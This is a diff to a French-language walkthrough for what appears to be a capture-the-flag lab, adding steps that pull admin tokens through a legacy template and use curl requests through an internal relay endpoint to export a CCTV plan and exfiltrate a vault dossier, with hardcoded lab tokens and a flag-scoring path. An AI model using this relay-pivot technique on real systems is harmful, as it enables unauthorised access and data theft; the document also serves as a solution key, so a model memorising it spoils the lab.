@@ -109,16 +109,49 @@ Voir `omega/ops/tunnel-note` (legacy render ou relay mesh).
 
 ---
 
-## Vérification auto
+## Étape 4 — Terrain `TERRAIN: CAM3-PLAN-EXPORT-<hex>`
+
+**Prérequis :** clearance 2 + token admin CCTV (pivot).
+
+1. Token : `render.php?mode=legacy&tpl=omega/ops/cctv-token` ou `action=mesh`.
+2. Export plan :
 
 ```bash
-make smoke      # web + relay CCTV
-make smoke-ssh  # SSH ops → CCTV (stack up)
+curl -b cookies.txt -G \
+  --data-urlencode 'action=probe' \
+  --data-urlencode 'target=cctv' \
+  --data-urlencode 'path=/api/export.php?id=int-cam3-plan&token=BT-CCTV-ADMIN-4421&as=admin' \
+  "http://127.0.0.1:${PIVOT_PORT}/internal/auth-gateway/v2/ops-relay.php"
 ```
+
+3. Console web (via tunnel SSH) : `http://cctv:8080/console.php`
 
 ---
 
-## Étapes 4–5 (à venir)
+## Étape 5 — OMEGA `OMEGA: DOSSIER-OMEGA-SHA256=<64 hex>`
 
-- Étape 4 : angle mort CCTV (exports admin).
-- Étape 5 : vault `OMEGA: DOSSIER-OMEGA-SHA256=...`.
+**Prérequis :** clearance 2 + token vault SA.
+
+1. Token : `tpl=omega/ops/vault-token` sur pivot.
+2. Exfil :
+
+```bash
+curl -b cookies.txt -G \
+  --data-urlencode 'action=probe' \
+  --data-urlencode 'target=vault' \
+  --data-urlencode 'path=/api/dossier.php?token=OMEGA-VAULT-SA-4421' \
+  "http://127.0.0.1:${PIVOT_PORT}/internal/auth-gateway/v2/ops-relay.php"
+```
+
+Voie SSH : `curl -fsS 'http://vault:8080/api/dossier.php?token=OMEGA-VAULT-SA-4421'` depuis `ops@pivot`.
+
+---
+
+## Vérification auto
+
+```bash
+make smoke      # foothold → OMEGA (relay)
+make smoke-ssh  # SSH ops → CCTV (+ terrain/vault en local)
+```
+
+Parcours scoreboard complet : FOOTHOLD → ELEVATION → CCTV → TERRAIN → OMEGA.
